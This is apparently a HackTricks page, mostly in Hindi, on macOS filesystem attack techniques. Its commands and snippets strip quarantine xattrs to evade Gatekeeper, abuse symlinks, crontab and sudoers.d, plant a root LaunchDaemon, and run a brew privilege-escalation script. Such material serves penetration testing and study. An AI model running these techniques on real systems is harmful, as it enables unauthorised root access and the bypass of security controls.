# macOS FS Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## POSIX permissions combinations

Permissions in a **directory**:

* **read** - आप **directory entries** को **enumerate** कर सकते हैं
* **write** - आप directory में **files** को **delete/write** कर सकते हैं और आप **empty folders** को **delete** कर सकते हैं।
* लेकिन आप **non-empty folders** को **delete/modify** नहीं कर सकते जब तक कि आपके पास इसके ऊपर write permissions न हों।
* आप **folder का नाम** **modify** नहीं कर सकते जब तक कि आप इसके मालिक न हों।
* **execute** - आपको directory को **traverse** करने की **अनुमति** है - यदि आपके पास यह अधिकार नहीं है, तो आप इसके अंदर या किसी भी subdirectories में कोई files तक पहुँच नहीं सकते।

### Dangerous Combinations

**कैसे root द्वारा स्वामित्व वाली file/folder को overwrite करें**, लेकिन:

* पथ में एक parent **directory owner** उपयोगकर्ता है
* पथ में एक parent **directory owner** एक **users group** है जिसमें **write access** है
* एक users **group** को **file** पर **write** access है

पिछले किसी भी संयोजन के साथ, एक हमलावर **inject** कर सकता है एक **sym/hard link** अपेक्षित पथ पर एक विशेषाधिकार प्राप्त मनमाना write प्राप्त करने के लिए।

### Folder root R+X Special case

यदि एक **directory** में files हैं जहाँ **केवल root को R+X access** है, तो वे **किसी और के लिए उपलब्ध नहीं हैं**। इसलिए एक vulnerability जो **एक file को स्थानांतरित करने की अनुमति देती है जिसे एक उपयोगकर्ता द्वारा पढ़ा जा सकता है**, जिसे उस **restriction** के कारण नहीं पढ़ा जा सकता, इस folder **से एक अलग में**, इन files को पढ़ने के लिए दुरुपयोग किया जा सकता है।

Example in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

यदि एक विशेषाधिकार प्राप्त प्रक्रिया **file** में डेटा लिख रही है जिसे **lower privileged user** द्वारा **control** किया जा सकता है, या जिसे एक lower privileged user द्वारा **पहले बनाया गया** हो। उपयोगकर्ता बस इसे एक Symbolic या Hard link के माध्यम से **दूसरे file** की ओर **point** कर सकता है, और विशेषाधिकार प्राप्त प्रक्रिया उस file पर लिखेगी।

Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.

## .fileloc

**`.fileloc`** एक्सटेंशन वाली files अन्य applications या binaries की ओर इशारा कर सकती हैं ताकि जब वे खोली जाएं, तो application/binary वह होगी जो निष्पादित होगी।\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Arbitrary FD

यदि आप **प्रक्रिया को उच्च विशेषाधिकारों के साथ एक फ़ाइल या फ़ोल्डर खोलने** के लिए मजबूर कर सकते हैं, तो आप **`crontab`** का दुरुपयोग करके `/etc/sudoers.d` में एक फ़ाइल खोलने के लिए **`EDITOR=exploit.py`** का उपयोग कर सकते हैं, ताकि `exploit.py` को `/etc/sudoers` के अंदर फ़ाइल का FD मिल सके और इसका दुरुपयोग कर सके।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Avoid quarantine xattrs tricks

### Remove it
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि किसी फ़ाइल/फ़ोल्डर में यह अपरिवर्तनीय विशेषता है, तो उस पर xattr डालना संभव नहीं होगा।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

एक **devfs** माउंट **xattr का समर्थन नहीं करता**, अधिक जानकारी के लिए [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल को उसकी ACEs सहित कॉपी करता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखना संभव है कि xattr के अंदर संग्रहीत ACL पाठ प्रतिनिधित्व **`com.apple.acl.text`** के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक एप्लिकेशन को **AppleDouble** फ़ाइल प्रारूप में एक ज़िप फ़ाइल में संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को इसमें लिखने से रोकता है... तो क्वारंटाइन xattr एप्लिकेशन में सेट नहीं किया गया था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) की जांच करें।

इसे दोहराने के लिए, हमें पहले सही acl स्ट्रिंग प्राप्त करने की आवश्यकता है:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## कोड सिग्नेचर बायपास करें

Bundles में फ़ाइल **`_CodeSignature/CodeResources`** होती है जिसमें **bundle** में हर एक **file** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executables** में **embedded** होता है, इसलिए हम इसके साथ भी छेड़छाड़ नहीं कर सकते।

हालांकि, कुछ फ़ाइलें हैं जिनके सिग्नेचर की जांच नहीं की जाएगी, इनमें plist में omit कुंजी होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
यह CLI से एक संसाधन के हस्ताक्षर की गणना करना संभव है:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Mount dmgs

एक उपयोगकर्ता एक कस्टम dmg को माउंट कर सकता है जो कुछ मौजूदा फ़ोल्डरों के ऊपर भी बनाया गया है। इस तरह आप कस्टम सामग्री के साथ एक कस्टम dmg पैकेज बना सकते हैं:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

आमतौर पर macOS डिस्क को `com.apple.DiskArbitrarion.diskarbitrariond` Mach सेवा से जोड़ता है (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाती है)। यदि LaunchDaemons plist फ़ाइल में `-d` पैरामीटर जोड़ा जाए और पुनः प्रारंभ किया जाए, तो यह `/var/log/diskarbitrationd.log` में लॉग संग्रहीत करेगा।\
हालांकि, `com.apple.driver.DiskImages` kext के साथ सीधे संवाद करने के लिए `hdik` और `hdiutil` जैसे उपकरणों का उपयोग करना संभव है।

## मनमाने लेखन

### आवधिक शेल स्क्रिप्ट

यदि आपकी स्क्रिप्ट को **शेल स्क्रिप्ट** के रूप में व्याख्यायित किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** शेल स्क्रिप्ट को ओवरराइट कर सकते हैं, जो हर दिन ट्रिगर होगी।

आप इस स्क्रिप्ट के निष्पादन को **`sudo periodic daily`** के साथ **फेक** कर सकते हैं।

### डेमन

एक मनमाना **LaunchDaemon** लिखें जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जिसमें एक plist हो जो एक मनमानी स्क्रिप्ट को निष्पादित करे जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

## Generate writable files as other users

यह एक फ़ाइल उत्पन्न करेगा जो रूट की है जो मेरे द्वारा लिखी जा सकती है ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). यह privesc के रूप में भी काम कर सकता है:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**POSIX साझा मेमोरी** POSIX-अनुरूप ऑपरेटिंग सिस्टम में प्रक्रियाओं को एक सामान्य मेमोरी क्षेत्र तक पहुँचने की अनुमति देती है, जो अन्य इंटर-प्रोसेस संचार विधियों की तुलना में तेज़ संचार को सुविधाजनक बनाती है। इसमें `shm_open()` के साथ एक साझा मेमोरी ऑब्जेक्ट बनाना या खोलना, `ftruncate()` के साथ इसका आकार सेट करना, और `mmap()` का उपयोग करके इसे प्रक्रिया के पते के स्थान में मैप करना शामिल है। प्रक्रियाएँ फिर सीधे इस मेमोरी क्षेत्र से पढ़ और लिख सकती हैं। समवर्ती पहुँच को प्रबंधित करने और डेटा भ्रष्टाचार को रोकने के लिए, समन्वय तंत्र जैसे म्यूटेक्स या सेमाफोर का अक्सर उपयोग किया जाता है। अंततः, प्रक्रियाएँ `munmap()` और `close()` के साथ साझा मेमोरी को अनमैप और बंद करती हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ मेमोरी ऑब्जेक्ट को हटा देती हैं। यह प्रणाली विशेष रूप से उन वातावरणों में कुशल, तेज IPC के लिए प्रभावी है जहाँ कई प्रक्रियाओं को तेजी से साझा डेटा तक पहुँचने की आवश्यकता होती है।

<details>

<summary>उत्पादक कोड उदाहरण</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** एक सुरक्षा विशेषता है जो macOS में उपयोगकर्ता अनुप्रयोगों में **फाइल डिस्क्रिप्टर ऑपरेशंस** की सुरक्षा और विश्वसनीयता को बढ़ाने के लिए पेश की गई है। ये संरक्षित डिस्क्रिप्टर एक विशेष प्रतिबंध या "गार्ड" को फाइल डिस्क्रिप्टर के साथ जोड़ने का एक तरीका प्रदान करते हैं, जिसे कर्नेल द्वारा लागू किया जाता है।

यह विशेषता कुछ प्रकार की सुरक्षा कमजोरियों जैसे **अनधिकृत फाइल एक्सेस** या **रेस कंडीशंस** को रोकने के लिए विशेष रूप से उपयोगी है। ये कमजोरियाँ तब होती हैं जब, उदाहरण के लिए, एक थ्रेड एक फाइल डिस्क्रिप्शन को एक्सेस कर रहा होता है जिससे **दूसरे कमजोर थ्रेड को उस पर एक्सेस मिलता है** या जब एक फाइल डिस्क्रिप्टर को **एक कमजोर चाइल्ड प्रोसेस द्वारा विरासत में लिया जाता है**। इस कार्यक्षमता से संबंधित कुछ कार्य हैं:

* `guarded_open_np`: एक गार्ड के साथ FD खोलें
* `guarded_close_np`: इसे बंद करें
* `change_fdguard_np`: एक डिस्क्रिप्टर पर गार्ड फ्लैग बदलें (यहां तक कि गार्ड सुरक्षा को हटाना)

## References

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
